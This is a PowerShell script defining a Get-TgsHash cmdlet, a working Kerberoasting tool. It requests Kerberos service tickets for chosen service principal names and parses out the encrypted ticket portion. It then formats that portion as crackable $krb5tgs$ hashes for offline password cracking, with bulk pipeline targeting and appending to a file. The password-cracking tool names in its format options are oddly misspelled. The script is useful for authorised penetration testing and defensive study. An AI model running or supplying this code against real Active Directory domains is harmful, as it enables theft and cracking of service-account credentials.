function Get-TgsHash {
    <#
    .SYNOPSIS
        Requests a Kerberos service ticket for a given SPN and extracts the TGS hash encrypted portion.

    .DESCRIPTION
        Get-TgsHash request a Kerberos service ticket for the specified SPN using the provided credentials.
        It parses the GSS-API / KRB_AP_REQ frame, extracts the encrypted ticket portion,
        and formats the result for offline work.

        If DistinguishedName is not supplied, the function performs an LDAP query against
        Active Directory to resolve it automatically (used to derive the domain component of
        the hash). Hashes can optionally be appended to a file for bulk collection.

        Accepts pipeline input so multiple SPNs can be processed in a single run.


    .PARAMETER Spn
        The Service Principal Name of the target account (e.g. 'MSSQLSvc/sql01.corp.local:1433').
        Accepts pipeline input by property name.

    .PARAMETER SamAccountName
        The SAM account name of the target service account (e.g. 'svc_sql').
        If omitted, the username from -Credential is used. Accepts pipeline input by property name.

    .PARAMETER DistinguishedName
        The full Distinguished Name of the target account
        (e.g. 'CN=svc_sql,OU=Service Accounts,DC=corp,DC=local').
        If omitted, an LDAP query is performed to resolve it. Accepts pipeline input by property name.

    .PARAMETER Credential
        A PSCredential object used to authenticate the Kerberos ticket request and,
        if required, the LDAP lookup. Use Get-Credential to create this object.

    .PARAMETER DomainController
        Optional FQDN or IP of the domain controller to target for the LDAP lookup.
        If omitted, the default DC for the current environment is used.

    .PARAMETER OutputFile
        Optional path to a file where extracted hashes will be appended (UTF-8, one hash per line).
        The file is created if it does not exist.

    .PARAMETER Format
        Output format for the extracted hash. Valid values:
          Hashyy  - : $krb5tgs$<etype>$*<user>$<domain>$<spn>*$<checksum>$<enc>
          jooo    - :   $krb5tgs$<spn>:<checksum>$<enc>

    .EXAMPLE
        $cred = Get-Credential corp\jon
        Get-TgsHash -Spn 'MSSQLSvc/sql01.corp.local:1433' -Credential $cred

        Requests a TGS for the SQL service account and outputs the hash.

    .EXAMPLE
        $cred = Get-Credential corp\jon
        Get-TgsHash -Spn 'HTTP/web01.corp.local' -SamAccountName 'svc_web' -Credential $cred -Format jooo

        Requests a TGS and outputs the hash.

    .EXAMPLE
        $cred = Get-Credential corp\jon
        $targets = @(
            [PSCustomObject]@{ Spn = 'MSSQLSvc/sql01.corp.local:1433'; SamAccountName = 'svc_sql' }
            [PSCustomObject]@{ Spn = 'HTTP/web01.corp.local';           SamAccountName = 'svc_web' }
        )
        $targets | Get-TgsHash -Credential $cred -OutputFile C:\hashes.txt

        Pipes multiple targets through the function and appends all hashes to a file.

    .EXAMPLE
        $cred = Get-Credential corp\jon
        Get-TgsHash -Spn 'MSSQLSvc/sql01.corp.local:1433' -Credential $cred `
                    -DomainController 'dc01.corp.local'

        Targets a specific DC for the LDAP lookup.

    .NOTES
        Requires the System.IdentityModel assembly (available in the full .NET Framework).
        The requesting user must have network access to a KDC.

        Import this file as a module to use the cmdlet:
            Import-Module .\Get-TgsHash.ps1

        Hash  references:
          Hashxxt mode : 13100  (use -Format Hashyy)
          John module  : krb5tgs (use -Format jooo)
    #>

    [CmdletBinding()]
    [OutputType([string])]
    param(
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true)]
        [string]$Spn,

        [Parameter(Mandatory = $false, ValueFromPipelineByPropertyName = $true)]
        [string]$SamAccountName,

        [Parameter(Mandatory = $false, ValueFromPipelineByPropertyName = $true)]
        [string]$DistinguishedName,

        [Parameter(Mandatory = $true)]
        [pscredential]$Credential,

        [Parameter(Mandatory = $false)]
        [string]$DomainController,

        [Parameter(Mandatory = $false)]
        [string]$OutputFile,

        [ValidateSet('Hashyy', 'jooo')]
        [string]$Format = 'Hashyy'
    )

    begin {
        # Load assembly once for the entire pipeline run
        if (-not ([System.Management.Automation.PSTypeName]'System.IdentityModel.Tokens.KerberosRequestorSecurityToken').Type) {
            Add-Type -AssemblyName System.IdentityModel
        }

        $networkCredential = $Credential.GetNetworkCredential()
        # GetNetworkCredential() splits DOMAIN\user automatically — .UserName is clean
        $credUser = $networkCredential.UserName

        $knownEtypes = @{
            17 = 'AES128-CTS-HMAC-SHA1'
            18 = 'AES256-CTS-HMAC-SHA1'
            23 = 'RC4-HMAC'
        }
    }

    process {
        # --- Resolve SamAccountName ---
        $resolvedSam = if (-not [string]::IsNullOrEmpty($SamAccountName)) {
            $SamAccountName
        } else {
            Write-Host "[*] SamAccountName not provided — falling back to credential user: $credUser"
            $credUser
        }

        # --- Resolve DistinguishedName via LDAP if not supplied ---
        $resolvedDN = $DistinguishedName
        if ([string]::IsNullOrEmpty($resolvedDN)) {
            Write-Host "[*] DistinguishedName not provided — querying AD for: $resolvedSam"
            try {
                $ldapPath = if ($DomainController) { "LDAP://$DomainController" } else { 'LDAP://' }
                $dirEntry = New-Object System.DirectoryServices.DirectoryEntry(
                    $ldapPath,
                    $networkCredential.UserName,
                    $networkCredential.Password
                )
                $searcher = New-Object System.DirectoryServices.DirectorySearcher($dirEntry)
                $searcher.Filter = "(sAMAccountName=$resolvedSam)"
                $searcher.PropertiesToLoad.Add('distinguishedName') | Out-Null
                $result = $searcher.FindOne()

                if ($result) {
                    $resolvedDN = $result.Properties['distinguishedname'][0]
                    Write-Host "[+] Resolved DN: $resolvedDN"
                } else {
                    Write-Host "[-] No AD result for '$resolvedSam' — domain will be UNKNOWN in hash"
                    $resolvedDN = 'UNKNOWN'
                }
            } catch {
                Write-Host "[-] AD lookup failed: $($_.Exception.Message) — domain will be UNKNOWN in hash"
                $resolvedDN = 'UNKNOWN'
            }
        }

        # --- Request the service ticket ---
        Write-Host "[*] Requesting ticket for: $Spn"
        try {
            $tokenID             = [Guid]::NewGuid().ToString()
            $impersonationLevel  = [System.Security.Principal.TokenImpersonationLevel]::Impersonation

            $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
                -ArgumentList $Spn, $impersonationLevel, $networkCredential, $tokenID
        } catch {
            Write-Host "[-] Failed to obtain ticket for '$Spn': $($_.Exception.Message)"
            return
        }

        $TicketByteStream = $token.GetRequest()
        if (-not $TicketByteStream) {
            Write-Host "[-] GetRequest() returned no data for '$Spn'"
            return
        }

        # --- Parse GSS-API / KRB_AP_REQ frame (RFC 4121 §4.1) ---
        # Extract: etype, ciphertext length, ciphertext
        $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-', ''

        if ($TicketHexStream -notmatch 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)$') {
            Write-Host "[-] Unable to parse ticket structure for '$($token.ServicePrincipalName)'"
            return
        }

        $Etype         = [int][Convert]::ToByte($Matches['EtypeLen'], 16)
        $CipherTextLen = [Convert]::ToUInt32($Matches['CipherTextLen'], 16) - 4
        $DataToEnd     = $Matches['DataToEnd']

        # --- Validate etype ---
        if ($knownEtypes.ContainsKey($Etype)) {
            Write-Host "[+] Etype $Etype ($($knownEtypes[$Etype])) captured for '$($token.ServicePrincipalName)'"
        } else {
            Write-Host "[!] Unknown etype $Etype for '$($token.ServicePrincipalName)' — hash may not be crackable"
        }

        # --- Extract ciphertext ---
        $CipherText = $DataToEnd.Substring(0, $CipherTextLen * 2)

        if ($DataToEnd.Substring($CipherTextLen * 2, 4) -ne 'A482') {
            Write-Host "[-] Unexpected structure after ciphertext for '$($token.ServicePrincipalName)'"
            return
        }

        $Checksum = $CipherText.Substring(0, 32)   # first 16 bytes
        $EncPart  = $CipherText.Substring(32)       # remaining enc-part

        # --- Derive domain from DN ---
        if ($resolvedDN -ne 'UNKNOWN' -and $resolvedDN -match 'DC=') {
            $UserDomain = ($resolvedDN.Substring($resolvedDN.IndexOf('DC='))) `
                -replace 'DC=', '' -replace ',', '.'
        } else {
            $UserDomain = 'UNKNOWN'
        }

        # --- Build hash string ---
        switch ($Format) {
            'jooo' {
                $HashFormat = "`$krb5tgs`$$($token.ServicePrincipalName):$Checksum`$$EncPart"
            }
            'Hashyy' {
                $HashFormat = "`$krb5tgs`$$Etype`$*$resolvedSam`$$UserDomain`$$($token.ServicePrincipalName)*`$$Checksum`$$EncPart"
            }
        }

        Write-Output $HashFormat

        # --- Write to output file if specified ---
        if ($OutputFile) {
            try {
                Add-Content -Path $OutputFile -Value $HashFormat -Encoding UTF8
                Write-Host "[+] Hash appended to: $OutputFile"
            } catch {
                Write-Host "[-] Failed to write to '$OutputFile': $($_.Exception.Message)"
            }
        }
    }

    end {
        Write-Host "[*] Finished."
    }
}
